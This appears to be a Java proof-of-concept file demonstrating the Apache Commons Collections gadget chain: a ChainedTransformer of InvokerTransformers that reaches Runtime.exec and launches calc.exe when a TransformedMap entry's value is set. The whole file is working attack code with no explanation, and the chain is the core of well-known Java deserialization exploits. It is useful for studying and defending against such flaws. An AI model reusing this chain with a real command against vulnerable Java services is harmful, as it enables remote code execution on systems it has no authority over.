import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class Demo4 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
        		new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc.exe"})};      
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("key", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Map.Entry outerMapEntry = (Map.Entry) outerMap.entrySet().iterator().next();
        outerMapEntry.setValue("rewrite-value");
    }
}